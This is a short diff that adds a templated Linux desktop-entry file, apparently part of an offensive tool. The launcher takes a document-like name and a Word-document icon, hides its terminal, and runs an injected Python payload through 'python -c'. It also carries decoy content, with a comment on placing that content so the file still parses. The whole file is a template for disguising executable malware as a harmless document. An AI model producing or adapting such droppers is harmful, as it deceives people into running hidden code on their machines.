@@ -1,0 +1,9 @@
+[Desktop Entry]
+Version=1.0
+Name={{ filename }}
+Exec=python -c "{{ python_payload }}"
+Icon=application-vnd.openxmlformats-officedocument.wordprocessingml.document
+Terminal=false
+Type=Application
+{# The resource file must be the last entry in the Desktop file to be correctly parsed #}
+Resource={{ decoy_data }}
